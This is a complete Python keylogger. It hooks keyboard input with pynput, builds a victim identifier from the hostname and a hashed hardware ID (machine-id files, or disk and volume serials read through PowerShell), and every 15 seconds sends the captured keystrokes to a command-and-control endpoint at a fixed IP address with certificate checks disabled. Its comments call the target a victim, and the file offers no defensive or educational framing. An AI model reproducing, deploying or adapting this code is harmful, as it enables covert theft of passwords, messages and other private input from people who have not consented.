from pynput import keyboard
import requests
import threading
import time
import platform
import subprocess
import hashlib
import os

C2_URL = "https://10.5.41.160:8443/log"

# --- Gather stable victim identity ---
HOSTNAME = platform.node()

def get_hwid():
    """Return a hardware ID unique per machine, cross-platform."""
    try:
        system = platform.system()
        if system == "Linux":
            # Linux machine-id (systemd)
            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
                if os.path.exists(path):
                    with open(path) as f:
                        raw = f.read().strip()
                        return hashlib.sha256(raw.encode()).hexdigest()[:16]
            # fallback: hostname-based
            return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

        elif system == "Windows":
            # Try PowerShell (works Win7+)
            try:
                raw = subprocess.check_output(
                    ["powershell", "-Command",
                     "Get-CimInstance Win32_DiskDrive | Select-Object -First 1 -ExpandProperty SerialNumber"],
                    text=True, timeout=5
                ).strip()
            except Exception:
                # Fallback: volume serial number of C:\ (less unique but works everywhere)
                raw = subprocess.check_output(
                    ["powershell", "-Command",
                     "(Get-Volume -DriveLetter C).SerialNumber"],
                    text=True, timeout=5
                ).strip()

            if raw:
                return hashlib.sha256(raw.encode()).hexdigest()[:16]

        # macOS or fallback
        return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

    except Exception:
        return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

HWID = get_hwid()

buffer = []
lock = threading.Lock()

def beacon():
    global buffer
    while True:
        time.sleep(15)
        with lock:
            if not buffer:
                continue
            data = "".join(buffer)
            buffer = []
        try:
            requests.post(
                C2_URL,
                data={"k": data, "hostname": HOSTNAME, "hwid": HWID},
                verify=False,
                timeout=5,
            )
        except Exception:
            pass

def on_press(key):
    with lock:
        try:
            buffer.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                buffer.append(" ")
            else:
                key_str = str(key).replace("Key.", "")
                buffer.append(f" [{key_str}] ")

t = threading.Thread(target=beacon, daemon=True)
t.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()